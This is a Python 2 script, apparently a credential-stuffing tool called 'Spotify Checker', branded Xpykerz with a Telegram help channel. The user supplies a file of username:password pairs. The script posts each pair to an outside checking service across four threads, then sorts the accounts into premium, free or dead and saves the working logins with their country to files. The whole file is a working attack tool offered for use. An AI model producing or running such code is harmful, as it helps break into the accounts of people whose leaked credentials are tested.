#!/usr/bin/python

import requests
import requests as reqs
from threading import *
from itertools import islice

print "   _____             _   _  __          _____ _               _             "
print "  / ____|           | | (_)/ _|        / ____| |             | |            "
print " | (___  _ __   ___ | |_ _| |_ _   _  | |    | |__   ___  ___| | _____ _ __ "
print "  \___ \| '_ \ / _ \| __| |  _| | | | | |    | '_ \ / _ \/ __| |/ / _ \ '__|"
print "  ____) | |_) | (_) | |_| | | | |_| | | |____| | | |  __/ (__|   <  __/ |   "
print " |_____/| .__/ \___/ \__|_|_|  \__, |  \_____|_| |_|\___|\___|_|\_\___|_|   "
print "        | |                     __/ |                                       "
print "        |_|                    |___/                                        "
print "                                             www.xpykerz.com                "
print "                                             help : t.me/Xpykerz_Chat"

check = raw_input("\nWARNING....!..: The tools is on developing and this is BETA Version. Tool maybe miss behave sometimes. \n Do you want to continue (yes/no | Default:yes): ")

if check in ['n', 'N', 'No', 'no', 'NO']:
	quit()

account = raw_input("\nEnter the path to accounts file : ")
premiumac = open("PremiumAccounts.txt", 'w')
freeac = open("FreeAccounts.txt", 'w')

Pno = 0
Fno = 0
Dno = 0
tryno = 0

url = "https://checkz.net/tools/ajax.php"

loaded = len(open(account).readlines())
print "\n", loaded, " Accounts loaded for checking.......!"

print "\nStatus	|	Country	|	Expire Date	|	Username:Password\n"

def result(country, userpass,response):
	global Pno, Fno, Dno, tryno
	if 'Premium' in (response.text):
		Pac = "|Premium account| Country:"+ country + " | " + userpass 
		premiumac.write(Pac)
		tryno = tryno+1
		Pno = Pno+1
		print "|" , tryno, " Accounts Checked ..! | Premium:", Pno ," | Free: ", Fno ," | Dead: ", Dno
		print Pac
	elif 'Free' in (response.text):
		Fac = "|Free account | Country:"+ country + " Exp: Null| " + userpass
		freeac.write(Fac)
		tryno = tryno+1
		Fno = Fno+1
		print "|" , tryno, " Accounts Checked ..! | Premium:", Pno ," | Free: ", Fno ," | Dead: ", Dno
		print Fac
	else:
		tryno = tryno+1
		Dno = Dno+1
		print "|" , tryno, " Accounts Checked ..! | Premium:", Pno ," | Free: ", Fno ," | Dead: ", Dno
		print "Dead account | Country: Null | Exp: Null | " + userpass

def checker(userpass):
	form = {
		'checker':'spotify',
		'mplist':str(userpass),
		'proxylist':'127.0.0.1:80'
	}

	response = reqs.post(url, form, stream = True)

	country = ((response.text).split("Cntry:",1)[-1]).split("&", 1)[0]
	result(country, userpass,response)
	
class checker1(Thread):
	def run(self):
		with open(account) as lines:
			for lines in islice(lines, 0, loaded, 4):
				checker(lines)

class checker2(Thread):
	def run(self):
		with open(account) as lines:
			for lines in islice(lines, 1, loaded, 4):
				checker(lines)

class checker3(Thread):
	def run(self):
		with open(account) as lines:
			for lines in islice(lines, 2, loaded, 4):
				checker(lines)

class checker4(Thread):
	def run(self):
		with open(account) as lines:
			for lines in islice(lines, 3, loaded, 4):
				checker(lines)

#plz Do not increase the number of checker it may cause server down
t1 = checker1()
t2 = checker2()
t3 = checker3()
t4 = checker4()

t1.start()
t2.start()
t3.start()
t4.start()

t1.join()
t2.join()
t3.join()
t4.join()

print "\nTotal Checked account = ", tryno
print "\nPremium Accounts List Saved at : PremiumAccounts.txt \nFree Accounts List Saved at : FreeAccounts.txt"
print "\nSend your feed/report issue to @Xpykerz"